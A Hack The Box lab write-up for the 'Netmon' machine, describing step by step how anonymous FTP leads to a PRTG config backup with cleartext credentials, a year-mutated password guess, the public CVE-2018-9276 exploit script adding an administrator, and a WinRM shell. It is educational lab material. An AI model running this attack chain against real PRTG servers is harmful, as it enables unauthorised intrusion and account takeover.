# Netmon - Hack The Box Writeup

## Overview

* Machine: Netmon
* Difficulty: Easy
* Platform: Hack The Box
* IP: 10.129.26.212

---

## Reconnaissance

We start with an Nmap scan:

```bash
nmap -sC -sV --min-rate=1000 -p- 10.129.26.212
```

![Nmap Scan](images/Nmap.png)

### Result:

* 21/tcp → FTP (Microsoft ftpd) — Anonymous login allowed
* 80/tcp → HTTP (PRTG Network Monitor 18.1.37.13946)
* 135/tcp → MSRPC
* 139/tcp → NetBIOS-SSN
* 445/tcp → SMB (Windows Server 2016)
* 5985/tcp → WinRM (Microsoft HTTPAPI 2.0)

Anonymous FTP login is allowed and exposes the full system filesystem.

---

## FTP Enumeration

Connecting anonymously to FTP:

```bash
ftp 10.129.26.212
# Username: anonymous
# Password: anonymous
```

![FTP Login](images/FTPLogin.png)

Navigating the filesystem, we find the PRTG configuration directory:

```
ProgramData/Paessler/PRTG Network Monitor/
```

Listing the contents reveals backup configuration files:

```
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
```

![FTP Files](images/FTPFiles.png)

---

## Credential Discovery

We download the oldest backup file:

```bash
python3 -c "
from ftplib import FTP
ftp = FTP('10.129.26.212')
ftp.login('anonymous','anonymous')
ftp.cwd('ProgramData/Paessler/PRTG Network Monitor')
with open('PRTG Configuration.old.bak', 'wb') as f:
    ftp.retrbinary('RETR PRTG Configuration.old.bak', f.write)
ftp.quit()
"
```

Searching for credentials inside the backup:

```bash
grep -A2 "prtgadmin" "PRTG Configuration.old.bak"
```

We find cleartext credentials:

```
<!-- User: prtgadmin -->
PrTg@dmin2018
```

![Credentials](images/Credentials.png)

---

## Authentication

The backup is from 2018. Testing a year-incremented password against the PRTG API:

```bash
curl "http://10.129.26.212/api/getpasshash.htm?username=prtgadmin&password=PrTg@dmin2019"
```

Response:

```
3989397458
```

Login successful with:

```text
prtgadmin : PrTg@dmin2019
```

![PRTG Login](images/PRTGLogin.png)

---

## Version Identification

From the HTTP response headers and PRTG dashboard:

* PRTG Network Monitor version: **18.1.37.13946**

This version is vulnerable to authenticated remote code execution via notification parameter injection (CVE-2018-9276).

![PRTG Dashboard](images/Dashboard.png)

---

## Exploit Discovery

Searching for known exploits:

```bash
searchsploit prtg
```

We find:

```
PRTG Network Monitor 18.2.38 - (Authenticated) RCE    windows/webapps/46527.sh
```

![searchsploit](images/searchsploit.png)

---

## Exploitation

Using the public exploit script with our session cookie:

```bash
bash 46527.sh -u "http://10.129.26.212" -c "OCTOPUS1813713946=<YOUR_COOKIE>"
```

The exploit creates a new local administrator user via PRTG's notification execution feature:

```
[*] adding a new user 'pentest' with password 'P3nT3st!'
[*] adding a user pentest to the administrators group
[*] exploit completed
```

![Exploit](images/Exploit.png)

---

## Initial Access

Using the newly created credentials to get a shell via WinRM:

```bash
evil-winrm -i 10.129.26.212 -u pentest -p 'P3nT3st!'
```

Checking our identity:

```bash
whoami
```

Output:

```
netmon\pentest
```

No further privilege escalation required — we are already a local administrator.

![Shell](images/Shell.png)

---

## User Flag

Navigate to the user flag:

```bash
type C:\Users\Public\Desktop\user.txt
```

![User Flag](images/UserFlag.png)

---

## Root Flag

Navigate to the administrator desktop:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

![Root Flag](images/RootFlag.png)

---

## Lessons Learned

* Anonymous FTP can expose sensitive application data, including configuration backups
* Cleartext credentials in backup files are a critical risk
* Passwords derived from years/seasons are easily guessed through mutation
* Outdated software with known CVEs leads directly to remote code execution
* PRTG Network Monitor 18.x is vulnerable to authenticated RCE via notification injection

---

## Conclusion

This machine demonstrates how a single misconfiguration — anonymous FTP access — can cascade into full system compromise. The backup file exposed credentials, a simple year mutation bypassed the password change, and a public exploit delivered administrator-level access without any privilege escalation step.

---

## Tags

Web, FTP, Credential Leak, RCE, PRTG, WinRM, Easy
